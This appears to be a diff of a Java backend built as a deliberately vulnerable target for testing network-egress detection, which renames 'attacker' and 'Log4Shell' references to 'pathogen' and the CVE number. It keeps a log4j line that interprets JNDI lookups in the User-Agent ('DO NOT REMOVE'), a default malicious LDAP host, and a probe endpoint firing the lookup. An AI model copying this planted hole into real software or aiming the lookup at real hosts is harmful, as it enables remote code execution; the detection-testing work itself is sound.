@@ -22,7 +22,7 @@ import java.util.regex.Pattern;
  * Normal traffic exercises the DB on every call, so the chain's baseline includes
  * a steady backend→postgres edge (which is what the JNDI exfil hop blends into).
  *
- *   GET  /api/products            list catalog        (logs UA through log4j — vulnerable surface)
+ *   GET  /api/products            list catalog        (logs UA through the logging library — vulnerable surface)
  *   GET  /api/products?q=&category=   filtered search (ILIKE + category)
  *   GET  /api/products/{id}       product detail
  *   POST /api/login               looks up user by email, returns a (fake) JWT
@@ -34,11 +34,11 @@ import java.util.regex.Pattern;
  * Postgres connection comes from env (POSTGRES_HOST, POSTGRES_DB, POSTGRES_USER),
  * trust auth (empty password) — same as the deploy manifests.
  *
- * Where the malicious LDAP referral server lives — the endpoint the Log4Shell
+ * Where the malicious LDAP referral server lives — the endpoint the CVE-2021-44228
  * JNDI lookup dials out to — is env-driven so the same image runs anywhere
- * (mirrors the attacker image's CODEBASE_HOST/CODEBASE_URL, see PR #144):
+ * (mirrors the pathogen image's CODEBASE_HOST/CODEBASE_URL, see PR #144):
  *   LDAP_URL   full override, e.g. ldap://1.2.3.4:1389/Probe
- *   LDAP_HOST  just host[:port] (default: the in-cluster attacker Service)
+ *   LDAP_HOST  just host[:port] (default: the in-cluster pathogen Service)
  * A non-private/public LDAP_HOST is what makes the backend's call-out egress
  * non-private, so R0011 (unexpected egress) fires — the network side of the
  * chain. The /api/_probe endpoint fires this lookup on demand.
@@ -46,7 +46,7 @@ import java.util.regex.Pattern;
 public class App {
     private static final Logger log = LogManager.getLogger(App.class);
 
-    private static final String PG_HOST = env("POSTGRES_HOST", "chain-postgres");
+    private static final String PG_HOST = env("POSTGRES_HOST", "postgres");
     private static final String PG_DB   = env("POSTGRES_DB", "appdb");
     private static final String PG_USER = env("POSTGRES_USER", "postgres");
     private static final String PG_URL  = "jdbc:postgresql://" + PG_HOST + ":5432/" + PG_DB;
@@ -59,7 +59,7 @@ public class App {
     static String ldapUrl() {
         String url = System.getenv("LDAP_URL");
         if (url != null && !url.isEmpty()) return url;
-        return "ldap://" + env("LDAP_HOST", "attacker.attacker-ns.svc.cluster.local:1389") + "/Probe";
+        return "ldap://" + env("LDAP_HOST", "pathogen.pathogen-ns.svc.cluster.local:1389") + "/Probe";
     }
 
     static Connection conn() throws SQLException { return DriverManager.getConnection(PG_URL, PG_USER, ""); }
@@ -76,16 +76,16 @@ public class App {
         s.createContext("/healthz",      ex -> respond(ex, 200, "{\"status\":\"ok\"}"));
         s.setExecutor(Executors.newFixedThreadPool(8));
         s.start();
-        log.info("chain-backend started on port {} (db={}, ldap={})", port, PG_URL, LDAP_URL);
+        log.info("backend started on port {} (db={}, ldap={})", port, PG_URL, LDAP_URL);
     }
 
-    // ─────────────────── /api/_probe (configurable Log4Shell self-probe) ───────────────────
+    // ─────────────────── /api/_probe (configurable CVE-2021-44228 self-probe) ───────────────────
     /**
      * Fires the JNDI trigger at the configured LDAP endpoint through the SAME
-     * vulnerable log4j line as ProductHandler. Lets a caller trip one
+     * vulnerable logging library line as ProductHandler. Lets a caller trip one
      * deterministic, off-profile LDAP egress (a falsifiability probe) without a
      * separate attack pod — the destination is wherever LDAP_URL/LDAP_HOST points,
-     * so it pairs with the attacker image's public CODEBASE_HOST (PR #144) to
+     * so it pairs with the pathogen image's public CODEBASE_HOST (PR #144) to
      * exercise the network side (R0011). On a patched build the string is logged
      * literally and no lookup happens. Normal traffic never hits this path.
      */
@@ -146,7 +146,7 @@ public class App {
             String query = ex.getRequestURI().getQuery();
             String ua    = ex.getRequestHeaders().getFirst("User-Agent");
             String q     = param(query, "q");
-            // The vulnerable line — log4j ≤ 2.14.1 interprets ${jndi:…} in the UA here. DO NOT REMOVE.
+            // The vulnerable line — the logging library ≤ 2.14.1 interprets ${jndi:…} in the UA here. DO NOT REMOVE.
             log.info("product query q={} ua={}", q, ua);
 
             String idPart = path.length() > "/api/products".length()
